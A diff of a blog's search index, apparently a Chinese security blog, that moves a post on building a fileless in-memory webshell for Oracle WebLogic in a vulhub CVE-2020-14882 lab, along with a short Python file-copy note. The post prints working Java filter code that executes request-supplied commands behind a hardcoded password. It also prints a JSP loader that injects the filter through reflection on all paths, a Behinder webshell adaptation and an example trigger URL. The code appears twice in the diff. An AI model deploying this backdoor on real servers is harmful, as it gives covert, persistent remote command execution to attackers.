-<p>把<code>kuron3k0</code>的<code>cmd</code>代码拿去编译，使用<code>vscode</code>，修复一下问题，编译，对<code>java</code>不熟，也是通过这次学习了很多<code>java</code>相关知识</p>
-<p><code>vscode</code>中文件无红色报错，保存会自动编译到<code>output</code>，查看<code>Configure Classpath</code>即可找到路径，无需再手动<code>F5</code>编译，否则会提示找不到主类</p>
-<p>源代码中会使网站所有访问被过滤，导致执行后网站会500，稍作修改</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line">   </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cmdFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span></span>&#123;</span><br><span class="line">   </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;&#125;;</span><br><span class="line">   </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">   </span><br><span class="line">        System.out.println(<span class="string">&quot;============== in evilfilter ==============&quot;</span>);</span><br><span class="line">        String pwd = request.getParameter(<span class="string">&quot;pwd&quot;</span>);</span><br><span class="line">        String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(pwd!=<span class="keyword">null</span> &amp;&amp; cmd!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(pwd.equals(<span class="string">&quot;redn3ck&quot;</span>)) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;============== running cmd ==============&quot;</span>);</span><br><span class="line">                String result = <span class="keyword">new</span> java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(<span class="string">&quot;\\A&quot;</span>).next();</span><br><span class="line">                response.getOutputStream().println(result);</span><br><span class="line">                response.getOutputStream().flush();</span><br><span class="line">       </span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;chain.doFilter(request, response);&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;chain.doFilter(request, response);&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>编译完成后，把<code>class</code>文件转为<code>base64</code>，用<code>py</code>完成</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">toBase64</span>(<span class="params">file, txt</span>):</span></span><br><span class="line">    <span class="keyword">with</span> open(file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> fileObj:</span><br><span class="line">        data = fileObj.read()</span><br><span class="line">        base64_data = base64.b64encode(data)</span><br><span class="line">        fout = open(txt, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">        fout.write(base64_data.decode())</span><br><span class="line">        fout.close()</span><br><span class="line"></span><br><span class="line">toBase64(<span class="string">r&#x27;C:\Users\Administrator\AppData\Roaming\Code\User\workspaceStorage\45d8f755763e840a79506c5be7b5e7b6\redhat.java\jdt_ws\cmd_7037b187\bin\cmdFilter.class&#x27;</span>, <span class="string">&#x27;out.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>
-<h3 id="2-加载恶意类-动态注册filter"><a class="header-anchor" href="#2-加载恶意类-动态注册filter">¶</a>2. 加载恶意类+动态注册<code>filter</code></h3>
-<p>由于我们是<code>webshell</code>环境，肯定是执行<code>jsp</code>最为方便，所以使用<code>jsp</code>加载刚才生成的<code>base64</code>，并动态注册<code>filter</code></p>
-<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> <span class="keyword">import</span>=<span class="string">&quot;java.util.*&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Method&quot;</span> %&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">&quot;c&quot;</span> uri=<span class="string">&quot;http://java.sun.com/jsp/jstl/core&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">	<span class="keyword">byte</span>[] codeClass = java.util.Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAfQcAAgEACWNtZEZpbHRlcg..&quot;</span>);</span><br><span class="line">	ClassLoader cl = (ClassLoader)Thread.currentThread().getContextClassLoader();</span><br><span class="line">	Method define = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="keyword">byte</span>[].class, <span class="keyword">int</span>.class, <span class="keyword">int</span>.class);</span><br><span class="line">	define.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">	Class evilFilterClass  = (Class)define.invoke(cl,codeClass,<span class="number">0</span>,codeClass.length);</span><br><span class="line"></span><br><span class="line"><span class="comment">//动态注册filter</span></span><br><span class="line"></span><br><span class="line">	String filterName = <span class="string">&quot;weblogic.work.SystemFilter.cmd&quot;</span>;</span><br><span class="line"></span><br><span class="line">	java.lang.reflect.Field cachedClassesF = cl.getClass().getDeclaredField(<span class="string">&quot;cachedClasses&quot;</span>);</span><br><span class="line">	cachedClassesF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">	Object cachedClass = cachedClassesF.get(cl);</span><br><span class="line">	java.lang.reflect.Method putM = cachedClass.getClass().getDeclaredMethod(<span class="string">&quot;put&quot;</span>, Object.class, Object.class);</span><br><span class="line">	putM.invoke(cachedClass, filterName, evilFilterClass);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取context</span></span><br><span class="line">	Class&lt;?&gt; executeThread = Class.forName(<span class="string">&quot;weblogic.work.ExecuteThread&quot;</span>);</span><br><span class="line">	java.lang.reflect.Method m = executeThread.getDeclaredMethod(<span class="string">&quot;getCurrentWork&quot;</span>);</span><br><span class="line">	Object currentWork = m.invoke(Thread.currentThread());</span><br><span class="line"></span><br><span class="line">	java.lang.reflect.Field connectionHandlerF = currentWork.getClass().getDeclaredField(<span class="string">&quot;connectionHandler&quot;</span>);</span><br><span class="line">	connectionHandlerF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">	Object obj = connectionHandlerF.get(currentWork);</span><br><span class="line"></span><br><span class="line">	java.lang.reflect.Field requestF = obj.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">	requestF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">	obj = requestF.get(obj);</span><br><span class="line"></span><br><span class="line">	java.lang.reflect.Field contextF = obj.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">	contextF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">	Object context = contextF.get(obj);</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用registerFilter注册</span></span><br><span class="line">	String evilName = <span class="string">&quot;weblogic.system.method.cmd&quot;</span>;</span><br><span class="line"></span><br><span class="line">	java.lang.reflect.Method getFilterManagerM = context.getClass().getDeclaredMethod(<span class="string">&quot;getFilterManager&quot;</span>);</span><br><span class="line">	Object filterManager = getFilterManagerM.invoke(context);</span><br><span class="line"></span><br><span class="line">	java.lang.reflect.Method registerFilterM = filterManager.getClass().getDeclaredMethod(<span class="string">&quot;registerFilter&quot;</span>, String.class, String.class, String[].class, String[].class, java.util.Map.class, String[].class);</span><br><span class="line">	registerFilterM.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">	registerFilterM.invoke(filterManager, evilName, filterName, <span class="keyword">new</span> String[]&#123;<span class="string">&quot;/*&quot;</span>&#125;, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<div class="note warning">坑点：最后一行代码中`url`需要改为`new String[]{"/*"}`，意为对网站所有目录生效</div>
-<p>把该<code>jsp</code>拿去网站目录访问即可执行</p>
-<div class="note danger">注意：`jsp`在哪个目录执行，最终利用就在该目录</div>
-<p>在其他目录利用会导致传参失败，该问题也是坑了很久</p>
-<p>我在<code>/console/css/cmd.jsp</code>目录下执行，所以<code>/console/css/?pwd=redn3ck&amp;cmd=id</code></p>
-<p><img src="cmd_ok.png" alt="cmd_ok"></p>
-<h2 id="内存webshell实现"><a class="header-anchor" href="#内存webshell实现">¶</a>内存<code>webshell</code>实现</h2>
-<p>原理一样，编译作者改好的冰蝎马，加载并注册即可</p>
-<p>编译时<code>weblogic.servlet.internal.ServletRequestImpl</code>变红，没有这个库，去环境中把相关jar全部拿回</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">find</span> / -name weblogic.jar</span><br><span class="line">cp /var/lib/docker/overlay2/d13f05c242a61c2ec44aea486b84d94793ad7026d83a52be9d990378d22453ff/merged/u01/oracle/wlserver/server/lib/*.jar /tmp/jar/</span><br><span class="line">chmod <span class="number">777</span> /tmp/jar/</span><br></pre></td></tr></table></figure>
-<p><code>vscode</code>配置<code>Configure Classpath</code>，选中所有<code>jar</code>，即可编译成功</p>
-<p>执行<code>jsp</code>后使用冰蝎连接发现并不成功，查看终端<code>log</code></p>
-<p><img src="behinder_error.png" alt="behinder_error"></p>
-<p>提示第30行类型转换出错，遂将类型转换删除</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//map.put(&quot;response&quot;, ((weblogic.servlet.internal.ServletRequestImpl)request).getResponse());</span></span><br><span class="line">map.put(<span class="string">&quot;response&quot;</span>, response);</span><br></pre></td></tr></table></figure>
-<p>重新编译并执行，成功！</p>
-<p><img src="behinder_ok.png" alt="behinder_ok"></p>
-<div class="note warning">需要注意的是，两次注册的名字需要更改，否则会把之前注册的覆盖掉或者导致网站500</div>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String filterName = <span class="string">&quot;weblogic.work.SystemFilter.behinder&quot;</span>;</span><br><span class="line">String evilName = <span class="string">&quot;weblogic.system.method.behinder&quot;</span>;</span><br></pre></td></tr></table></figure>
-<h2 id="总结"><a class="header-anchor" href="#总结">¶</a>总结</h2>
-<p>该方式可实现无文件<code>shell</code>，安全性大大提升，但由于是基于内存，重启服务器必然会消失</p>
-<p>另外，<code>java</code>这块很薄弱，感谢宝哥对我的大力帮助！瑞思拜，不肉！</p>
-<h2 id="参考链接"><a class="header-anchor" href="#参考链接">¶</a>参考链接</h2>
-<blockquote>
-<p><a href="https://kuron3k0.github.io/2021/04/23/weblogic-memshell-1/">https://kuron3k0.github.io/2021/04/23/weblogic-memshell-1/</a><br>
-<a href="https://paper.seebug.org/1249/">https://paper.seebug.org/1249/</a></p>
-</blockquote>
-]]></content>
-      <tags>
-        <tag>vulhub</tag>
-        <tag>weblogic</tag>
-        <tag>java</tag>
-        <tag>shell</tag>
-        <tag>无文件</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Zimbra - SSRF+Memcached+反序列化复现</title>
     <url>/2019/04/30/Zimbra-SSRF-Memcached-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<h2 id="环境搭建"><a class="header-anchor" href="#环境搭建">¶</a>环境搭建</h2>
@@ -727,6 +810,63 @@ Windows 10 Version 1809 for 32-bit Systems</p>
       </tags>
   </entry>
   <entry>
+    <title>Weblogic - 无文件内存shell</title>
+    <url>/2021/09/27/Weblogic-%E6%97%A0%E6%96%87%E4%BB%B6%E5%86%85%E5%AD%98shell/</url>
+    <content><![CDATA[<h2 id="环境搭建"><a class="header-anchor" href="#环境搭建">¶</a>环境搭建</h2>
+<p>采用<code>vulhub</code>中<code>weblogic</code> <code>CVE-2020-14882</code>搭建，<code>vulhub</code>安装不赘述</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> vulhub/weblogic/CVE-<span class="number">2020</span>-<span class="number">14882</span>/</span><br><span class="line">sudo docker-compose up</span><br></pre></td></tr></table></figure>
+<h2 id="内存cmd实现"><a class="header-anchor" href="#内存cmd实现">¶</a>内存<code>cmd</code>实现</h2>
+<p>原理和机制感兴趣的可以去看参考链接，比较详细，我跳过（太菜，看不懂😭）</p>
+<p>大致流程为：加载恶意类，动态注册<code>filter</code></p>
+<h3 id="1-编写恶意filter类"><a class="header-anchor" href="#1-编写恶意filter类">¶</a>1. 编写恶意<code>filter</code>类</h3>
+<div class="note info"><p>阅读本篇文章能了解到：weblogic, 内存马实现，冰蝎</p></div>
+<a id="more"></a>
+<p>把<code>kuron3k0</code>的<code>cmd</code>代码拿去编译，使用<code>vscode</code>，修复一下问题，编译，对<code>java</code>不熟，也是通过这次学习了很多<code>java</code>相关知识</p>
+<p><code>vscode</code>中文件无红色报错，保存会自动编译到<code>output</code>，查看<code>Configure Classpath</code>即可找到路径，无需再手动<code>F5</code>编译，否则会提示找不到主类</p>
+<p>源代码中会使网站所有访问被过滤，导致执行后网站会500，稍作修改</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line">   </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cmdFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span></span>&#123;</span><br><span class="line">   </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;&#125;;</span><br><span class="line">   </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">   </span><br><span class="line">        System.out.println(<span class="string">&quot;============== in evilfilter ==============&quot;</span>);</span><br><span class="line">        String pwd = request.getParameter(<span class="string">&quot;pwd&quot;</span>);</span><br><span class="line">        String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(pwd!=<span class="keyword">null</span> &amp;&amp; cmd!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(pwd.equals(<span class="string">&quot;redn3ck&quot;</span>)) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;============== running cmd ==============&quot;</span>);</span><br><span class="line">                String result = <span class="keyword">new</span> java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(<span class="string">&quot;\\A&quot;</span>).next();</span><br><span class="line">                response.getOutputStream().println(result);</span><br><span class="line">                response.getOutputStream().flush();</span><br><span class="line">       </span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;chain.doFilter(request, response);&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;chain.doFilter(request, response);&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编译完成后，把<code>class</code>文件转为<code>base64</code>，用<code>py</code>完成</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">toBase64</span>(<span class="params">file, txt</span>):</span></span><br><span class="line">    <span class="keyword">with</span> open(file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> fileObj:</span><br><span class="line">        data = fileObj.read()</span><br><span class="line">        base64_data = base64.b64encode(data)</span><br><span class="line">        fout = open(txt, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">        fout.write(base64_data.decode())</span><br><span class="line">        fout.close()</span><br><span class="line"></span><br><span class="line">toBase64(<span class="string">r&#x27;C:\Users\Administrator\AppData\Roaming\Code\User\workspaceStorage\45d8f755763e840a79506c5be7b5e7b6\redhat.java\jdt_ws\cmd_7037b187\bin\cmdFilter.class&#x27;</span>, <span class="string">&#x27;out.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="2-加载恶意类-动态注册filter"><a class="header-anchor" href="#2-加载恶意类-动态注册filter">¶</a>2. 加载恶意类+动态注册<code>filter</code></h3>
+<p>由于我们是<code>webshell</code>环境，肯定是执行<code>jsp</code>最为方便，所以使用<code>jsp</code>加载刚才生成的<code>base64</code>，并动态注册<code>filter</code></p>
+<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> <span class="keyword">import</span>=<span class="string">&quot;java.util.*&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Method&quot;</span> %&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">&quot;c&quot;</span> uri=<span class="string">&quot;http://java.sun.com/jsp/jstl/core&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">	<span class="keyword">byte</span>[] codeClass = java.util.Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAfQcAAgEACWNtZEZpbHRlcg..&quot;</span>);</span><br><span class="line">	ClassLoader cl = (ClassLoader)Thread.currentThread().getContextClassLoader();</span><br><span class="line">	Method define = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="keyword">byte</span>[].class, <span class="keyword">int</span>.class, <span class="keyword">int</span>.class);</span><br><span class="line">	define.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">	Class evilFilterClass  = (Class)define.invoke(cl,codeClass,<span class="number">0</span>,codeClass.length);</span><br><span class="line"></span><br><span class="line"><span class="comment">//动态注册filter</span></span><br><span class="line"></span><br><span class="line">	String filterName = <span class="string">&quot;weblogic.work.SystemFilter.cmd&quot;</span>;</span><br><span class="line"></span><br><span class="line">	java.lang.reflect.Field cachedClassesF = cl.getClass().getDeclaredField(<span class="string">&quot;cachedClasses&quot;</span>);</span><br><span class="line">	cachedClassesF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">	Object cachedClass = cachedClassesF.get(cl);</span><br><span class="line">	java.lang.reflect.Method putM = cachedClass.getClass().getDeclaredMethod(<span class="string">&quot;put&quot;</span>, Object.class, Object.class);</span><br><span class="line">	putM.invoke(cachedClass, filterName, evilFilterClass);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取context</span></span><br><span class="line">	Class&lt;?&gt; executeThread = Class.forName(<span class="string">&quot;weblogic.work.ExecuteThread&quot;</span>);</span><br><span class="line">	java.lang.reflect.Method m = executeThread.getDeclaredMethod(<span class="string">&quot;getCurrentWork&quot;</span>);</span><br><span class="line">	Object currentWork = m.invoke(Thread.currentThread());</span><br><span class="line"></span><br><span class="line">	java.lang.reflect.Field connectionHandlerF = currentWork.getClass().getDeclaredField(<span class="string">&quot;connectionHandler&quot;</span>);</span><br><span class="line">	connectionHandlerF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">	Object obj = connectionHandlerF.get(currentWork);</span><br><span class="line"></span><br><span class="line">	java.lang.reflect.Field requestF = obj.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">	requestF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">	obj = requestF.get(obj);</span><br><span class="line"></span><br><span class="line">	java.lang.reflect.Field contextF = obj.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">	contextF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">	Object context = contextF.get(obj);</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用registerFilter注册</span></span><br><span class="line">	String evilName = <span class="string">&quot;weblogic.system.method.cmd&quot;</span>;</span><br><span class="line"></span><br><span class="line">	java.lang.reflect.Method getFilterManagerM = context.getClass().getDeclaredMethod(<span class="string">&quot;getFilterManager&quot;</span>);</span><br><span class="line">	Object filterManager = getFilterManagerM.invoke(context);</span><br><span class="line"></span><br><span class="line">	java.lang.reflect.Method registerFilterM = filterManager.getClass().getDeclaredMethod(<span class="string">&quot;registerFilter&quot;</span>, String.class, String.class, String[].class, String[].class, java.util.Map.class, String[].class);</span><br><span class="line">	registerFilterM.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">	registerFilterM.invoke(filterManager, evilName, filterName, <span class="keyword">new</span> String[]&#123;<span class="string">&quot;/*&quot;</span>&#125;, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<div class="note warning">坑点：最后一行代码中`url`需要改为`new String[]{"/*"}`，意为对网站所有目录生效</div>
+<p>把该<code>jsp</code>拿去网站目录访问即可执行</p>
+<div class="note danger">注意：`jsp`在哪个目录执行，最终利用就在该目录</div>
+<p>在其他目录利用会导致传参失败，该问题也是坑了很久</p>
+<p>我在<code>/console/css/cmd.jsp</code>目录下执行，所以<code>/console/css/?pwd=redn3ck&amp;cmd=id</code></p>
+<p><img src="cmd_ok.png" alt="cmd_ok"></p>
+<h2 id="内存webshell实现"><a class="header-anchor" href="#内存webshell实现">¶</a>内存<code>webshell</code>实现</h2>
+<p>原理一样，编译作者改好的冰蝎马，加载并注册即可</p>
+<p>编译时<code>weblogic.servlet.internal.ServletRequestImpl</code>变红，没有这个库，去环境中把相关jar全部拿回</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">find</span> / -name weblogic.jar</span><br><span class="line">cp /var/lib/docker/overlay2/d13f05c242a61c2ec44aea486b84d94793ad7026d83a52be9d990378d22453ff/merged/u01/oracle/wlserver/server/lib/*.jar /tmp/jar/</span><br><span class="line">chmod <span class="number">777</span> /tmp/jar/</span><br></pre></td></tr></table></figure>
+<p><code>vscode</code>配置<code>Configure Classpath</code>，选中所有<code>jar</code>，即可编译成功</p>
+<p>执行<code>jsp</code>后使用冰蝎连接发现并不成功，查看终端<code>log</code></p>
+<p><img src="behinder_error.png" alt="behinder_error"></p>
+<p>提示第30行类型转换出错，遂将类型转换删除</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//map.put(&quot;response&quot;, ((weblogic.servlet.internal.ServletRequestImpl)request).getResponse());</span></span><br><span class="line">map.put(<span class="string">&quot;response&quot;</span>, response);</span><br></pre></td></tr></table></figure>
+<p>重新编译并执行，成功！</p>
+<p><img src="behinder_ok.png" alt="behinder_ok"></p>
+<div class="note warning">需要注意的是，两次注册的名字需要更改，否则会把之前注册的覆盖掉或者导致网站500</div>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String filterName = <span class="string">&quot;weblogic.work.SystemFilter.behinder&quot;</span>;</span><br><span class="line">String evilName = <span class="string">&quot;weblogic.system.method.behinder&quot;</span>;</span><br></pre></td></tr></table></figure>
+<h2 id="总结"><a class="header-anchor" href="#总结">¶</a>总结</h2>
+<p>该方式可实现无文件<code>shell</code>，安全性大大提升，但由于是基于内存，重启服务器必然会消失</p>
+<p>另外，<code>java</code>这块很薄弱，感谢宝哥对我的大力帮助！瑞思拜，不肉！</p>
+<h2 id="参考链接"><a class="header-anchor" href="#参考链接">¶</a>参考链接</h2>
+<blockquote>
+<p><a href="https://kuron3k0.github.io/2021/04/23/weblogic-memshell-1/">https://kuron3k0.github.io/2021/04/23/weblogic-memshell-1/</a><br>
+<a href="https://paper.seebug.org/1249/">https://paper.seebug.org/1249/</a></p>
+</blockquote>
+]]></content>
+      <tags>
+        <tag>vulhub</tag>
+        <tag>weblogic</tag>
+        <tag>java</tag>
+        <tag>shell</tag>
+        <tag>无文件</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>duomiCMS</title>
     <url>/2016/11/01/duomiCMS/</url>
     <content><![CDATA[<h2 id="变量覆盖导致注入"><a class="header-anchor" href="#变量覆盖导致注入">¶</a>变量覆盖导致注入</h2>
@@ -763,6 +903,25 @@ Windows 10 Version 1809 for 32-bit Systems</p>
       </tags>
   </entry>
   <entry>
+    <title>python - 本地文件操作</title>
+    <url>/2020/09/23/python-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</url>
+    <content><![CDATA[<h2 id="前言"><a class="header-anchor" href="#前言">¶</a>前言</h2>
+<p>拿到一个本地文件操作需求，写个<code>py</code>完成<br>
+水文，仅作笔记用途，再不水一年要过去了，蓝受。。香菇。。</p>
+<h2 id="需求"><a class="header-anchor" href="#需求">¶</a>需求</h2>
+<p>要求：解析<code>&quot;文件信息.txt&quot;</code>，根据解析出的<code>md5</code>值找到对应的文件，按照解析出的文件路径复制到相应的目录下。<br>
+例如：解析第一行，根据第一个<code>md5</code>值<code>38C45AC1A54F65732CFE56C7BCC17A87</code>遍历当前文件夹及子文件夹找到对应的文件<code>123.exe</code>，再根据解析出的路径<code>&quot;I_DONOT_远控&quot;</code>复制到<code>&quot;C:\I\DONOT\远控&quot;</code>下。</p>
+<h2 id="Code"><a class="header-anchor" href="#Code">¶</a>Code</h2>
+<div class="note info"><p>阅读本篇文章能了解到：python</p></div>
+<a id="more"></a>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os,hashlib,shutil</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&#x27;文件信息.txt&#x27;</span>, encoding=<span class="string">&#x27;utf-8-sig&#x27;</span>, mode=<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> inF:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> inF:</span><br><span class="line">            temp = line.strip().split(<span class="string">&#x27;#&#x27;</span>)[<span class="number">0</span>].split(<span class="string">&#x27;\t\t&#x27;</span>)</span><br><span class="line">            print(temp)</span><br><span class="line">            _md5 = temp[<span class="number">0</span>]</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> parent, dirnames, filenames <span class="keyword">in</span> os.walk(<span class="string">&#x27;.\\&#x27;</span>,topdown=<span class="literal">False</span>):</span><br><span class="line">                <span class="keyword">for</span> filename <span class="keyword">in</span> filenames:</span><br><span class="line">                    file_path = os.path.join(parent, filename)</span><br><span class="line">                    <span class="keyword">with</span> open(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> fileF:</span><br><span class="line">                        md5obj = hashlib.md5()</span><br><span class="line">                        md5obj.update(fileF.read())</span><br><span class="line">                        _hash = md5obj.hexdigest().upper()</span><br><span class="line">                        <span class="keyword">if</span> _md5 == _hash:</span><br><span class="line">                            flag = <span class="number">1</span></span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> flag:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            dirFile = temp[<span class="number">2</span>].strip().split(<span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">            pathTemp = <span class="string">&#x27;c:\\&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> dirFile:</span><br><span class="line">                pathTemp += i+<span class="string">&#x27;\\&#x27;</span></span><br><span class="line">                os.mkdir(pathTemp)</span><br><span class="line">            shutil.copy(file_path, pathTemp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+]]></content>
+      <tags>
+        <tag>笔记</tag>
+        <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>getPass - 一键批量获取远程终端凭据密码</title>
     <url>/2018/01/18/getPass-%E4%B8%80%E9%94%AE%E6%89%B9%E9%87%8F%E8%8E%B7%E5%8F%96%E8%BF%9C%E7%A8%8B%E7%BB%88%E7%AB%AF%E5%87%AD%E6%8D%AE%E5%AF%86%E7%A0%81/</url>
     <content><![CDATA[<h1>前言</h1>
@@ -785,25 +944,6 @@ Windows 10 Version 1809 for 32-bit Systems</p>
 ]]></content>
       <tags>
         <tag>工具</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>python - 本地文件操作</title>
-    <url>/2020/09/23/python-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</url>
-    <content><![CDATA[<h2 id="前言"><a class="header-anchor" href="#前言">¶</a>前言</h2>
-<p>拿到一个本地文件操作需求，写个<code>py</code>完成<br>
-水文，仅作笔记用途，再不水一年要过去了，蓝受。。香菇。。</p>
